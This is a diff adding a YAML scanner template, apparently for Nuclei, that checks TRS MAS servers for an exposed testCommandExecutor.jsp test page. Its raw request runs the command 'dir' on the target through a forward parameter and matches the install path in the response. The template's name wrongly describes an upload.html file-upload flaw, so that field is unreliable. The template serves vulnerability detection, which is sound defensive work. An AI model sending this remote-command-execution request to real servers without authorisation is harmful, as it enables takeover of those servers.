@@ -1,0 +1,27 @@
+id: trs-test-command-executor-rce
+
+info:
+  name: 拓尔思 MAS upload.html 后台文件上传漏洞
+  author: SleepingBag945
+  severity: high
+  description: |
+    拓尔思 TRS testCommandExecutor.jsp测试文件存在远程命令执行漏洞，当网站运维者未删除测试文件时，攻击者通过漏洞可以获取服务器权限
+    "TRS媒资管理系统登录页面"
+
+http:
+  - raw:
+      - |
+        GET /mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv= HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'D:\TRS\TRSMAS\'
+        condition: and
+
+      - type: status
+        status:
+          - 200
